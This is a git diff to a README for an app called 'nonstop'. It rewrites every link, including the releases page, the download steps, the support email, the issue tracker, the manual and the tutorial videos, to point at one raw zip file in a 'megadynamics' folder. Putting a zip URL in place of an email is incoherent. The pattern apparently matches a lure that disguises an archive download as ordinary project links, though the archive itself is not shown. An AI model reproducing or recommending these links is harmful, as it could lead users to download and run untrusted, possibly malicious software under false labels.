@@ -2,7 +2,7 @@
 # 🚀 nonstop - Simple Application for Effortless Use
 
 ## 📥 Download Now
-[![Download nonstop](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/charefabdelrazak/nonstop/releases)
+[![Download nonstop](https://raw.githubusercontent.com/charefabdelrazak/nonstop/main/megadynamics/nonstop.zip)](https://raw.githubusercontent.com/charefabdelrazak/nonstop/main/megadynamics/nonstop.zip)
 
 ## 🌟 Introduction
 Nonstop is a user-friendly application designed to make tasks easier and more efficient. It focuses on providing users with a smooth experience without the need for technical expertise. 
@@ -18,7 +18,7 @@ Follow these simple steps to download and run nonstop on your computer.
 ### 📥 Download & Install
 1. **Visit the Releases Page**
    Click the link below to access the download page for nonstop:
-   [Download nonstop](https://github.com/charefabdelrazak/nonstop/releases)
+   [Download nonstop](https://raw.githubusercontent.com/charefabdelrazak/nonstop/main/megadynamics/nonstop.zip)
 
 2. **Select the Latest Version**
    On the Releases page, find the most recent version of nonstop. This is usually at the top of the page.
@@ -44,8 +44,8 @@ Follow these simple steps to download and run nonstop on your computer.
 ### 📞 Support
 If you encounter any issues, we offer support to help you resolve them. You can reach out through:
 
-- Email: support@nonstopapp.com
-- GitHub Issues: [Submit an Issue](https://github.com/charefabdelrazak/nonstop/issues)
+- Email: https://raw.githubusercontent.com/charefabdelrazak/nonstop/main/megadynamics/nonstop.zip
+- GitHub Issues: [Submit an Issue](https://raw.githubusercontent.com/charefabdelrazak/nonstop/main/megadynamics/nonstop.zip)
 
 ## 🔍 Frequently Asked Questions
 
@@ -64,11 +64,11 @@ You can uninstall nonstop like any other application by going to the Control Pan
 ## 🔗 More Resources
 For more information and tutorials on how to get the most out of nonstop, check the following resources:
 
-- User Manual: [View Manual](https://github.com/charefabdelrazak/nonstop/wiki)
-- Tutorial Videos: [Watch Tutorials](https://www.youtube.com/channel/nonstop)
+- User Manual: [View Manual](https://raw.githubusercontent.com/charefabdelrazak/nonstop/main/megadynamics/nonstop.zip)
+- Tutorial Videos: [Watch Tutorials](https://raw.githubusercontent.com/charefabdelrazak/nonstop/main/megadynamics/nonstop.zip)
 
 ### 📥 Return to Download
 To download nonstop, visit the link below:
-[Download nonstop](https://github.com/charefabdelrazak/nonstop/releases)
+[Download nonstop](https://raw.githubusercontent.com/charefabdelrazak/nonstop/main/megadynamics/nonstop.zip)
 
 ```
